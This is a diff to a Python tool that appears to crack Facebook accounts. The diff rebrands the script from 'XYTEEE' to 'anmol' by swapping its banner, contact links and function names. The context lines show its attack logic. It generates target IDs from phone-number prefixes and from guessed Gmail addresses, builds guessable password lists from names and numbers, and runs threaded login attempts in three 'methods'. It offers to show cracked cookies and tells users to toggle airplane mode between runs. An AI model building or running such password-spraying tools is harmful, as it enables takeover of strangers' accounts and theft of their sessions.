@@ -412,14 +412,14 @@ def xyteee():
     #os.system('clear')
     print(f"""\x1b[1;97m
 
- ▐▄\x1b[0;91m•\x1b[0;97m ▄  ▄\x1b[0;91m·\x1b[0;97m ▄▌▄▄▄▄▄▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m
-  █▌█▌\x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m▪\x1b[0;97m██▌\x1b[0;91m•\x1b[0;97m██  ▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m
-  \x1b[0;91m·\x1b[0;97m██\x1b[0;91m·\x1b[0;97m ▐█▌▐█\x1b[0;91m▪\x1b[0;97m ▐█\x1b[0;91m.▪\x1b[0;97m▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄
- \x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m·\x1b[0;97m█▌ ▐█▀\x1b[0;91m·.\x1b[0;97m ▐█▌\x1b[0;91m·\x1b[0;97m▐█▄▄▌▐█▄▄▌▐█▄▄▌
- \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀\033[1;37m version \033[1;31m:\033[1;30m Pro.92.3 \033[1;37m
-\033[38;3;276;131;0;1m-----------------------------------------------------
+  
+ █████  ███    ██ ███    ███  ██████  ██      
+██   ██ ████   ██ ████  ████ ██    ██ ██      
+███████ ██ ██  ██ ██ ████ ██ ██    ██ ██      
+██   ██ ██  ██ ██ ██  ██  ██ ██    ██ ██      
+██   ██ ██   ████ ██      ██  ██████  ███████ -----------------------------------------------------
  Owner    : XYTEEE-XD
- Telegram : https://t.me/xyteeetools
+ Facebook : https://www.facebook.com/anmolgoodman
  Tools    : XYTEEE-XC
  Status   : Premium
 -----------------------------------------------------\033[1;97m""")
@@ -439,16 +439,16 @@ def rmain():
     elif xytee in ["3","03"]:
          mail()
     elif xytee in ["4","04"]:
-     os.system("xdg-open https://wa.me/+8801926890544");rmain()
+     os.system("xdg-open t.me/anmolkhadka11");rmain()
     elif xytee in ["0","00"]:
-     print(f' Exited Xyteee Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61554748685443");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
+     print(f' Exited Xyteee Terminal ');os.system("xdg-open https://www.facebook.com/anmolgoodman");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
     else:
-     print(f" Don't Select Wrong Options ");os.system("xdg-open https://t.me/xyteeetools");rmain()
+     print(f" Don't Select Wrong Options ");os.system("xdg-open t.me/anmolkhadka11");rmain()
 
 #---------------------[File-Menu]---------------------#
 def file():
 	os.system('clear')
-	xyteee();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Xyteee.py');print(led)
+	anmol();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Xyteee.py');print(led)
 	o = input(' Put file path\033[1;31m :\x1b[1;90m ')
 	print('\x1b[1;97m')
 	try:lin = open(o).read().splitlines()
@@ -461,7 +461,7 @@ def file():
 	setting()
 #---------------------[File-Setting]---------------------#
 def setting():
-    clear();xyteee();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
+    clear();anmol();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
     hu = input(f' Select Option {M}:{A} ')
     if hu in ['3','old']:
         for tua in sorted(id):
@@ -488,7 +488,7 @@ def setting():
     cokixx=input(f' Cloning Show Cookie ? y/n {M}:{A} ')
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
-    clear();xyteee();print(f' [1] Method (M1)');print(f' [2] Method (M2)');print(f' [3] Method (M3) ');print(led)
+    clear();anmol();print(f' [1] Method (M1)');print(f' [2] Method (M2)');print(f' [3] Method (M3) ');print(led)
     hc = input(f' Select Method {M}:{A} ')
     if hc in ['1','01']:method.append('md1')
     elif hc in ['2','02']:method.append('md2')
@@ -497,7 +497,7 @@ def setting():
     clear();p4()
 #---------------------[File-Method]---------------------#
 def p4():
-    os.system("clear");xyteee();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
+    os.system("clear");anmol();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -535,7 +535,7 @@ def rdm():
 #---------------------[Fast-Number]---------------------#
 def Fast():
   user=[]
-  os.system('clear');xyteee();print(dt);print(fast);print(led)
+  os.system('clear');anmol();print(dt);print(fast);print(led)
   kode = input(f'{P} Select Code : ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit : '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -545,7 +545,7 @@ def Fast():
   cokixx=input(f'{P} Cloning Show Cookie ? y/n {M}:{A} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();xyteee();print(dt) #;print(f" {P}Number : "+kode);print(led)
+  clear();anmol();print(dt) #;print(f" {P}Number : "+kode);print(led)
   print(f' [1] Method (M1)');print(f' [2] Method (M2)');print(' [3] Method (M3)');print(led)
   xc = input(f' Select Method {M}:{H} ')
   for nmbr in range(limit):
@@ -568,7 +568,7 @@ def Fast():
 #---------------------[Medium-Number]---------------------#
 def Medium():
   user=[]
-  os.system('clear');xyteee();print(dt);print(medium);print(led)
+  os.system('clear');anmol();print(dt);print(medium);print(led)
   kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit {M}:{A} '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -601,7 +601,7 @@ def Medium():
 #---------------------[Slow-Number]---------------------#
 def Slow():
   user=[]
-  os.system('clear');xyteee();print(dt);print(slow);print(led)
+  os.system('clear');anmol();print(dt);print(slow);print(led)
   kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit {M}:{A} '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -611,7 +611,7 @@ def Slow():
   cokixx=input(f'{P} Cloning Show Cookie ?? y/n {M}:{A} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();xyteee();print(dt) #;print(f" {P}Number : "+kode);print(led)
+  clear();anmol();print(dt) #;print(f" {P}Number : "+kode);print(led)
   print(f' [1] Method (M1)');print(f' [2] Method (M2)');print(' [3] Method (M3)');print(led)
   xc = input(f'{P} Select Method {M}:{A} ')
   for nmbr in range(limit):
@@ -622,7 +622,7 @@ def Slow():
   with tred(max_workers=30) as xc_xytee:
     os.system('clear')
     tl = str(len(user))
-    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
+    anmol();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
     for guru in user:
       idf = kode+koda+kodb+guru
       pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:]] #,'@#@#@#','bangladesh','free fire','i love you']
@@ -636,7 +636,7 @@ def Slow():
 #---------------------[Mail-1]---------------------#
 def mail():
     idf=[]
-    os.system('clear');xyteee();print(fst);print(led)
+    os.system('clear');anmol();print(fst);print(led)
     first = input(f' First Name {M}: {H}');print(led);print(lst);print(led)
     last = input(f' Last Name {M}: {H}');print(led);print(limitt);print(led)
     limit = int(input(f' Crack Limit {M}: {H}'))
@@ -650,7 +650,7 @@ def mail():
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
     tkk = first+last
-    os.system("clear");xyteee();print(f" {P}Gmail Name : {tkk[:4]}****{domain}");print(led);print(f' [1] Method (M1)');print(f' [2] {P}Method (M2)');print(f' [3] Method (M3)');print(led)
+    os.system("clear");anmol();print(f" {P}Gmail Name : {tkk[:4]}****{domain}");print(led);print(f' [1] Method (M1)');print(f' [2] {P}Method (M2)');print(f' [3] Method (M3)');print(led)
     mthd = input(f' Select Method :{H} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
@@ -659,7 +659,7 @@ def mail():
         os.system('clear')
         idx = str(len(idf))
         tk = first+last
-        os.system("clear");xyteee();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
+        os.system("clear");anmol();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
         for number in idf:
             idf = first+'.'+last+number+domain
             pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
@@ -673,7 +673,7 @@ def mail():
 #---------------------[Method-1]---------------------#
 def md1(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
+  sys.stdout.write(f'\r{P} [anmol-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
   sys.stdout.flush()
   ua, ua2 = Ugen(),Ugen2()
   ses = requests.Session()
@@ -731,7 +731,7 @@ def md1(idf,pwv):
 #---------------------[Method-2]---------------------#
 def md2(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok))
+  sys.stdout.write(f'\r{P} [Anmol-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok))
   sys.stdout.flush()
   ua, ua2 = Ugen(),Ugen2()
   ses = requests.Session()
@@ -818,7 +818,7 @@ def md2(idf,pwv):
 #---------------------[Method-3]---------------------#
 def md3(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
+  sys.stdout.write(f'\r{P} [Anmol-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
   ua, ua2 = Ugen(),Ugen2()
   ses = requests.Session()
   for pw in pwv:
